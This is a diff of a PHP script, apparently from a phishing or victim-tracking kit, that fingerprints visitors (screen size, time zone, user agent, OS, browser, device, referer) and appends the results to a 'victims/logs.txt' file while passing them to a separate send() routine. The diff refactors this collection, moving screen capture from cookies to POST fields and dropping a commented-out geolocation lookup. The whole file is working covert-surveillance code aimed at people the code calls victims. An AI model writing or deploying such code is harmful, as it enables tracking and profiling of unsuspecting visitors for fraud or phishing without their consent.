@@ -1,33 +1,37 @@
 <?php
 include(".././sender/sender.php");
 
-echo "<script>
-document.cookie = 'Width=' + window.screen.availWidth + ';'
-document.cookie = 'Height=' + window.screen.availHeight + ';'
-</script>";
-//Mozilla/5.0 (Windows NT 10.0; rv:79.0) Gecko/20100101 Firefox/79.0
+if ($_SERVER['REQUEST_METHOD'] === 'POST') 
+{
+	if(isset($_POST['Width']) and isset($_POST['Height']) and isset($_POST['TimeZone']))
+	{
+        $data = "Screen:".$_POST['Width']."x".$_POST['Height']."\n".
+                "TimeZone:".$_POST['TimeZone']."\n".
+                "Date:".(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
+	    
+	    write($data);    
+	}	
+}
 
+function write($data)
+{
+    File_Put_Contents(".././victims/logs.txt", $data, FILE_APPEND);
+}
 
 function LogData($IsBot,$Referer,$Page)
 { 
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $data = 
+	    "User Agent:".$user_agent."\n".
+        "OS:".Operating_System($user_agent)."\n".
+        "Browser:".Browser($user_agent)."\n".
+        "Device:".Device($user_agent)."\n".
+        ($Referer == null ? "" : "Referer:".$Referer."\n").
+        "Page:".$Page."\n".
+        "Bot:".($IsBot ? "Yes" : "No")."\n";
 
-    //$data = file_get_contents("http://ip-api.com/json");                                                      //Get data
-    //$data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
-    //$data = str_replace('"','',$data);                                                                        //Remove "
-    //$data = str_replace('{','',$data);                                                                        //Remove {
-    //$data = str_replace('}','',$data);                                                                        //Remove }
-    $data = "\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                        //Append Screen Size
-    $data .= "\nUser Agent:".$user_agent;                                                                //Append User agent
-    $data .= "\nOS:".Operating_System($user_agent);                                                      //Append Operating System
-    $data .= "\nBrowser:".Browser($user_agent);                                                          //Append Browser
-    $data .= "\nDevice:".Device($user_agent);                                                            //Append Device
-    $data .= ($Referer == null ? "" : "\nReferer:".$Referer);                                            //Append Http Referer
-    $data .= "\nPage:".$Page;                                                                            //Append Page Name
-    $data .= "\nBot:".($IsBot ? "Yes" : "No");                                                           //Append Bot
-    $data .= "\n\n";                                                                                     //Append dashes
-    
-    File_Put_Contents(".././victims/logs.txt", $data, FILE_APPEND);                                           //Append data to file
+
+    write($data);                                   
     send($data);
 }
 
